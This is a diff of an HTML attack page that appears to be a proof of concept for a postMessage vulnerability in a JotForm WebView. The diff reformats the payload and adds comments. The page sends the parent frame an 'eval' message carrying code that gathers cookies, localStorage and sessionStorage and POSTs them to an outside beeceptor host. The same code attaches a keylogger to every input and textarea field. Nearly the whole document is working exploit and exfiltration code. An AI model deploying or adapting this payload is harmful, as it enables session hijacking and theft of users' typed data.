@@ -3,15 +3,41 @@
 <head><title>Loading...</title></head>
 <body>
 <script>
+// Wait for parent frame to fully load the JotForm bridge
 setTimeout(function() {
-    var collectCode = "(function(){var d={cookies:document.cookie,ls:JSON.stringify(localStorage),ss:JSON.stringify(sessionStorage),url:location.href,ua:navigator.userAgent,ts:new Date().toISOString()};fetch('https://evilios.free.beeceptor.com/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});var obs=new MutationObserver(function(){document.querySelectorAll('input,textarea').forEach(function(i){if(!i.__h){i.__h=true;i.addEventListener('change',function(){fetch('https://evilios.free.beeceptor.com/keylog',{method:'POST',body:JSON.stringify({f:i.name||i.id,v:i.value})});});}});});obs.observe(document.body,{childList:true,subtree:true});})()";
+    var collectCode = [
+        '(function(){',
+        '  var data={',
+        '    cookies:document.cookie,',
+        '    ls:JSON.stringify(localStorage),',
+        '    ss:JSON.stringify(sessionStorage),',
+        '    url:location.href,',
+        '    ua:navigator.userAgent,',
+        '    ts:new Date().toISOString()',
+        '  };',
+        '  fetch("https://evilios.free.beeceptor.com/collect",{',
+        '    method:"POST",',
+        '    headers:{"Content-Type":"application/json"},',
+        '    body:JSON.stringify(data)',
+        '  });',
+        '  var obs=new MutationObserver(function(){',
+        '    document.querySelectorAll("input,textarea").forEach(function(i){',
+        '      if(!i.__h){i.__h=true;i.addEventListener("change",function(){',
+        '        fetch("https://evilios.free.beeceptor.com/keylog",{method:"POST",body:JSON.stringify({f:i.name||i.id,v:i.value})});',
+        '      });}',
+        '    });',
+        '  });',
+        '  obs.observe(document.body,{childList:true,subtree:true});',
+        '})()'
+    ].join('');
 
     var payload = {
         type: 'window.opener',
         name: 'eval',
-        args: [collectCode]
+        args: [collectCode]   // ← string of code, eval()'d in jotform.com context
     };
 
+    // Send to parent WebView — the vulnerable messageListener picks this up
     window.parent.postMessage(JSON.stringify(payload), '*');
 }, 500);
 </script>
